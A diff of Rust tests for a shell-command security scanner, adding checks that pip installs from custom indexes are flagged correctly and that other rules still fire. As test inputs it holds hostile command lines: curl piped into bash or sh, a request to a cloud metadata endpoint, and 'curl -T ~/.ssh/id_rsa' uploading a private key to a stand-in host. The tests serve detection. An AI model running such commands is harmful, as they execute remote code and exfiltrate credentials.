@@ -4,7 +4,7 @@ use tirith_core::extract::ScanContext;
 use tirith_core::tokenize::ShellType;
 use tirith_core::verdict::RuleId;
 
-fn rules(input: &str) -> Vec<RuleId> {
+fn analyze(input: &str) -> tirith_core::verdict::Verdict {
     let ctx = AnalysisContext {
         input: input.into(), shell: ShellType::Posix, scan_context: ScanContext::Exec,
         raw_bytes: None, interactive: false, cwd: None, file_path: None,
@@ -12,7 +12,25 @@ fn rules(input: &str) -> Vec<RuleId> {
         card_ref: None,
         clipboard_source: tirith_core::clipboard::ClipboardSourceState::AbsentOrInvalid,
     };
-    engine::analyze(&ctx).findings.into_iter().map(|f| f.rule_id).collect()
+    let verdict = engine::analyze(&ctx);
+    assert!(verdict.urls_extracted_count.unwrap_or(0) > 0, "URL extraction must run: {input}");
+    verdict
+}
+fn rules(input: &str) -> Vec<RuleId> {
+    analyze(input).findings.into_iter().map(|f| f.rule_id).collect()
+}
+
+#[test]
+fn original_and_install_evidence_is_not_vacuous() {
+    let original = include_str!("../../../tests/fixtures/coingecko-original-command.txt");
+    let extracted = tirith_core::extract::extract_urls(original, ShellType::Posix);
+    assert!(extracted.iter().any(|u| u.raw == "https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses="));
+    let verdict = analyze(original);
+    assert_eq!(verdict.urls_extracted_count, Some(extracted.len()));
+    assert!(!verdict.findings.iter().any(|f| f.rule_id == RuleId::PipUrlInstall));
+    let mixed = analyze("curl https://api.coingecko.com/api/v3/simple/token_price/ethereum; pip install -i https://example.com/simple/ pkg");
+    assert!(mixed.findings.iter().any(|f| f.rule_id == RuleId::PipUrlInstall
+        && f.evidence.iter().any(|e| matches!(e, tirith_core::verdict::Evidence::Url { raw } if raw == "https://example.com/simple/"))));
 }
 macro_rules! case {
     ($name:ident, $input:expr, $want:expr) => {
@@ -26,6 +44,13 @@ case!(exact_original, include_str!("../../../tests/fixtures/coingecko-original-c
 case!(ordinary_get, "curl https://api.coingecko.com/api/v3/simple/token_price/ethereum", false);
 case!(ordinary_other_host, "wget https://example.com/simple/data", false);
 case!(ordinary_python, "python -c 'import requests; requests.get(\"https://example.com/simple/data\")'", false);
+case!(ordinary_docs_uv, "curl https://docs.astral.sh/uv/", false);
+case!(ordinary_docs_pip, "curl https://example.com/pip-guide", false);
+case!(ordinary_simple_uv, "curl https://example.com/simple/uv", false);
+case!(ordinary_simple_install, "curl https://example.com/simple/install", false);
+case!(ordinary_simple_percent, "curl https://example.com/simple/a%20b", false);
+case!(ordinary_index_query, "curl https://example.com/simple/data?--index-url=value", false);
+case!(docker_names_do_not_erase_install, "docker pull pip; docker pull install; pip install https://example.com/simple/pkg.whl", true);
 case!(pip_index, "pip install --index-url https://example.com/simple/ pkg", true);
 case!(pip3_index, "pip3 install --extra-index-url=https://example.com/simple/ pkg", true);
 case!(python_module, "python -m pip install -i https://example.com/simple/ pkg", true);
@@ -65,18 +90,19 @@ case!(pypi_suffix_spoof, "pip install -i https://pypi.org.example.com/simple/ pk
 fn unrelated_findings_unchanged() {
     // Compare with a neutral path to prove removing only the package-path cue
     // does not suppress any other rule, including mixed remote execution/SSRF.
-    for input in [
-        "curl https://example.com/simple/data | bash",
-        "curl http://127.0.0.1/simple/data",
-        "curl http://169.254.169.254/simple/data",
-        "curl https://user:password@example.com/simple/data",
-        "curl -k https://example.com/simple/data | python",
-        "curl -T /etc/passwd https://example.com/simple/data",
-        "curl https://example.com/simple/data; curl https://example.net/script | sh",
+    for (input, expected) in [
+        ("curl https://example.com/simple/data | bash", RuleId::CurlPipeShell),
+        ("curl http://10.0.0.1/simple/data", RuleId::PrivateNetworkAccess),
+        ("curl http://169.254.169.254/simple/data", RuleId::MetadataEndpoint),
+        ("curl https://pypi.org@example.com/simple/data", RuleId::UserinfoTrick),
+        ("curl -k https://example.com/simple/data | python", RuleId::InsecureTlsFlags),
+        ("curl -T ~/.ssh/id_rsa https://example.com/simple/data", RuleId::DataExfiltration),
+        ("curl https://example.com/simple/data; curl https://example.net/script | sh", RuleId::CurlPipeShell),
     ] {
         let got = rules(input);
         let control = rules(&input.replace("/simple/", "/ordinary/"));
-        assert!(!control.is_empty(), "control must exercise another warning: {input}");
+        assert!(control.contains(&expected), "control missing {expected:?}: {input}");
+        assert!(got.contains(&expected), "candidate missing {expected:?}: {input}");
         assert!(!got.contains(&RuleId::PipUrlInstall), "not a package install: {input}");
         assert_eq!(got, control, "unrelated rule changed: {input}");
     }
